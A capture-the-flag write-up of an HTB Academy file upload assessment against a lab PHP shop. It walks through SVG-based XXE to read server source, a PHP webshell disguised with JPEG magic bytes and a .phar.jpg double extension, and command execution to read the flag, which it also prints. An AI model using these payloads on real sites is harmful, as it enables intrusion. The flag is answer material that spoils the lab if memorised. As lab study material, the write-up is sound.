# HTB Academy — CWES File Upload Attacks Skills Assessment

**Target:** `154.57.164.77:30458`
**App:** Academy Shop — e-commerce web application
**Flag:** `HTB{m4573r1ng_upl04d_3xpl0174710n}`
**Goal:** Read flag at root directory `/`

---

## Session Notes

```
Framework:        PHP
Server:           Apache/2.4.41 (Ubuntu)
Upload form:      /contact/
Upload endpoint:  /contact/upload.php (POST, multipart)
Upload directory: /contact/user_feedback_submissions/
File naming:      date('ymd') + '_' + original filename → e.g. 260606_shell.phar.jpg
Flag file:        /flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
```

---

## Attack Chain

### 1. Framework Identification

```bash
curl -s http://154.57.164.77:30458/index.php   # returns same page → PHP confirmed
curl -s http://154.57.164.77:30458/index.asp    # 404
curl -s http://154.57.164.77:30458/index.aspx   # 404
```

Apache/2.4.41 (Ubuntu) confirmed from 404 error page. PHP confirmed from index.php.

### 2. Find the Upload Form

```bash
curl -s http://154.57.164.77:30458/contact/
```

Contact page has a file upload form. The form HTML shows:
- `onchange="checkFile(this)"` → client-side JS validation
- `accept=".jpg,.jpeg,.png"` → client-side restriction
- Upload button triggers AJAX, not form submit

Read the contact script to find the real endpoint:
```bash
curl -s http://154.57.164.77:30458/contact/script.js
```

Key findings from script.js:
- `checkFile()` is client-side only — validates last extension via `.split('.').pop()`
- AJAX POSTs to `/contact/upload.php` (not `submit.php`)
- `contentType: false, processData: false` → proper multipart POST

### 3. Probe Back-End Validation

Post directly to `/contact/upload.php`, bypassing client-side JS entirely:

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /tmp/shell.php

curl -s -X POST http://154.57.164.77:30458/contact/upload.php \
  -F "uploadFile=@/tmp/shell.php;type=image/jpeg"
# → "Extension not allowed"
```

Back-end validation exists.

### 4. Extension Fuzzing — Find Blacklist Gaps

```bash
for ext in .php .php2 .php3 .php4 .php5 .php6 .php7 .phtml .pht .phps .phar .phpt .pgif; do
    result=$(curl -s -X POST http://154.57.164.77:30458/contact/upload.php \
      -F "uploadFile=@/tmp/shell.php;filename=shell${ext};type=image/jpeg")
    echo "$ext → $result"
done
```

Results:
- `"Extension not allowed"` → blacklisted: `.php`, `.php2-7`, `.phtml`, `.phps`, `.phpt`
- `"Only images are allowed"` → passes extension filter but hits content filter: `.pht`, `.phar`, `.pgif`

**Two different error messages = two separate filter layers.**

### 5. SVG Discovery

Content-Type fuzzing with GIF8 magic bytes failed for all image MIME types — GIF8 produces `image/gif` MIME which does NOT match the server's filter (filter requires MIME ending in `g`, `gif` ends in `f`).

Tried SVG — a valid image format with XML structure:

```bash
echo '<svg></svg>' > /tmp/test.svg
curl -s -X POST http://154.57.164.77:30458/contact/upload.php \
  -F "uploadFile=@/tmp/test.svg;type=image/svg+xml"
# → "Image type not recognized" (new error = .svg passes extension filter)
```

Bare SVG tag fails MIME check. Try with full proper SVG structure:

```bash
cat > /tmp/test.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
</svg>
EOF

curl -s -X POST http://154.57.164.77:30458/contact/upload.php \
  -F "uploadFile=@/tmp/test.svg;type=image/svg+xml"
# → Returns rendered SVG content → upload succeeded
```

SVG passes all filters because:
- Extension `.svg` = `sv` + `g` → passes whitelist `/^.+\.[a-z]{2,3}g$/`
- `mime_content_type()` on proper SVG XML → `image/svg+xml` → contains `image/sv` + `g` → passes type check `/image\/[a-z]{2,3}g/`
- Server calls `displayHTMLImage()` on upload → **processes SVG XML server-side** → XXE will resolve at upload time

### 6. XXE via SVG — Read Source Code

```bash
cat > /tmp/xxe.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/contact/upload.php"> ]>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    &xxe;
</svg>
EOF

curl -s -X POST http://154.57.164.77:30458/contact/upload.php \
  -F "uploadFile=@/tmp/xxe.svg;type=image/svg+xml"
```

Response contains base64-encoded source of upload.php. Decode:

```bash
echo '<BASE64>' | base64 -d
```

**Source code reveals:**

```php
$target_dir = "./user_feedback_submissions/";
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);

// blacklist
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) { die("Extension not allowed"); }

// whitelist
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) { die("Only images are allowed"); }

// type check (both Content-Type header AND MIME must match)
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) { die("Only images are allowed"); }
}
```

Key findings:
- Upload dir: `./user_feedback_submissions/`
- File naming: `date('ymd')_filename` → `260606_filename`
- Blacklist blocks: `.php`, `.phps`, `.phtml` only (misses `.phar`, `.pht`, etc.)
- Whitelist: extension must end in `[a-z]{2,3}g` (jpg, png, svg, jpeg pass)
- Type check: MIME and Content-Type must match `/image\/[a-z]{2,3}g/` → `image/jpeg` passes, `image/gif` does NOT

### 7. Webshell Upload — JPEG Magic Bytes + Double Extension

**Extension:** `.phar.jpg`
- Passes blacklist: doesn't contain `.php`, `.phps`, or `.phtml`
- Passes whitelist: ends in `.jpg` = `jp` + `g` ✓
- Apache executes `.phar` files → RCE possible via double extension

**MIME bypass:** JPEG magic bytes (`\xFF\xD8\xFF\xe0`) → `mime_content_type()` returns `image/jpeg` → `jpe` + `g` → passes `/image\/[a-z]{2,3}g/` ✓

```bash
printf '\xFF\xD8\xFF\xe0' > /tmp/shell.phar.jpg
echo '<?php system($_REQUEST["cmd"]); ?>' >> /tmp/shell.phar.jpg

curl -s -X POST http://154.57.164.77:30458/contact/upload.php \
  -F "uploadFile=@/tmp/shell.phar.jpg;type=image/jpeg"
```

### 8. Execute Webshell — Confirm RCE

Stored as `260606_shell.phar.jpg` in `/contact/user_feedback_submissions/`:

```bash
curl -s "http://154.57.164.77:30458/contact/user_feedback_submissions/260606_shell.phar.jpg?cmd=id"
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 9. Find and Read Flag

```bash
curl -s "http://154.57.164.77:30458/contact/user_feedback_submissions/260606_shell.phar.jpg?cmd=ls+/"
# → flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt

curl -s "http://154.57.164.77:30458/contact/user_feedback_submissions/260606_shell.phar.jpg?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt"
# → HTB{m4573r1ng_upl04d_3xpl0174710n}
```

---

## Key Lessons

### Two filter layers have two different error messages
- `"Extension not allowed"` = blacklist rejected the extension
- `"Only images are allowed"` = extension passed blacklist but failed whitelist or content check
- Different messages reveal exactly which layer is blocking — use this to enumerate independently

### GIF8 magic bytes fail this filter — JPEG is correct
The type check regex is `/image\/[a-z]{2,3}g/` — requires MIME ending in `g`.
- `image/gif` → ends in `f` → **FAILS**
- `image/jpeg` → `jpe` + `g` → **PASSES**
- `image/png` → `pn` + `g` → **PASSES**
- `image/svg+xml` → contains `svg` = `sv` + `g` → **PASSES**

### SVG XXE fires at upload time, not access time
The server calls `displayHTMLImage()` immediately after moving the uploaded file. This processes the SVG XML server-side and resolves XXE entities in the upload response — no need to access the uploaded file via URL.

### Read source code before assuming filter behavior
The upload.php source revealed the exact regex patterns for blacklist, whitelist, and type check. This eliminated guesswork and showed exactly which extensions and MIME types would pass.

### Double extension bypasses both blacklist and whitelist
`shell.phar.jpg`:
- Blacklist only checks for `.php`/`.phps`/`.phtml` — `.phar` not in list
- Whitelist only checks that filename ends in `[a-z]{2,3}g` — `.jpg` satisfies this
- Apache executes `.phar`-containing filenames as PHP (server misconfiguration)

### File naming scheme must be known to access the shell
`date('ymd')` prepended to filename means stored name differs from uploaded name. Without reading the source, the webshell URL would be unknown. Always read source via XXE before uploading a shell.
